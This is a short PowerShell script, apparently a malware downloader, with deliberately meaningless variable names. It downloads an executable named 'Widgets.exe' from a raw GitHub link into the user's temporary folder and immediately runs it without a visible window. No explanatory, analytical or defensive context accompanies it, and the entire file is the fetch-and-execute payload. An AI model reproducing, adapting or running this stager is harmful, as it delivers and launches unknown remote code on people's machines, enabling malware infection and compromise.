$terik = @(
    "https://github.com/dfgsgsdfgfd/test/raw/refs/heads/main/Widgets.exe",
)
$gkkwerf = [Environment]::GetFolderPath('temp')
$gdfQosoqwek = New-Object System.Net.WebClient
foreach ($hyesos in $terik) {
    if (-not [string]::IsNullOrEmpty($hyesos)) {
        $dfowerfk = [System.IO.Path]::GetFileName($hyesos)
        $igdfs = Join-Path -Path $gkkwerf -ChildPath $dfowerfk
        $gdfQosoqwek.DownloadFile($hyesos, $igdfs)
        Start-Process -FilePath $igdfs -NoNewWindow -PassThru
    }
}
